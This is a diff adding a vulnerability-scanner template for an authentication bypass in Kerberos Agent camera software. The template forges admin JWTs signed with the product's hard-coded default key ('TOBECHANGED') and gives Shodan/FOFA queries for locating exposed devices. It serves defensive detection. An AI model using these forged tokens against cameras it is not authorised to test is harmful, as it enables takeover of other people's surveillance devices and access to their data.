@@ -1,0 +1,70 @@
+id: CVE-2026-135208
+
+info:
+  name: Kerberos Agent - Authentication Bypass
+  author: s4e-io
+  severity: critical
+  description: |
+    Kerberos Agent < 3.14.4 contains an authentication bypass caused by JWTMiddleWare() fallback to a hard-coded key, letting unauthenticated attackers forge admin tokens to access sensitive routes and control the camera.
+  impact: |
+    Unauthenticated attackers can forge admin tokens to access sensitive data, modify configurations, and disable the camera.
+  remediation: |
+    Update to version 3.14.4 or later.
+  reference:
+    - https://github.com/kerberos-io/agent/security/advisories/GHSA-3c52-7fc8-c39j
+    - https://github.com/kerberos-io/agent/pull/361
+    - https://github.com/kerberos-io/agent/commit/c0baade8fd6e21ed1b9a834d9ae6b4eaaa67b3b6
+    - https://github.com/kerberos-io/agent/releases/tag/v3.14.4
+    - https://www.vulncheck.com/advisories/kerberos-agent-before-3.14.4-authentication-bypass-via-hard-coded-jwt-signing-key
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-135208
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2026-135208
+    cwe-id: CWE-1394
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: kerberos-io
+    product: agent
+    shodan-query: http.title:"Kerberos Agent"
+    fofa-query: title="Kerberos Agent"
+  tags: cve,cve2026,kerberos-agent,kerberos-io,iot,camera,jwt,auth-bypass,vuln
+
+variables:
+  default_secret: "TOBECHANGED"
+  control_secret: "{{randstr}}"
+  claims: '{"id":{"username":"root","role":"admin"},"exp":{{unix_time(3600)}},"orig_iat":{{unix_time()}}}'
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /api/config HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{generate_jwt(claims,"HS256",control_secret)}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 401'
+          - 'contains(to_lower(header), "jwt realm=kerberosio")'
+          - 'contains(body, "\"code\":401")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET /api/config HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{generate_jwt(claims,"HS256",default_secret)}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'contains_all(body, "\"config\":{", "\"capture\":{", "\"ipcamera\":{", "\"remove_after_upload\":")'
+        condition: and
+# digest: 4a0a0047304502205f86b98117ded81dfdce5e3eee2de181fca5acab42043704cf249bb155797b44022100a80619a1b5c6e73cc328ed9b38b20efa9789c415efe47662fe271c2f41370ce6:922c64590222798bb761d5b6d8e72950
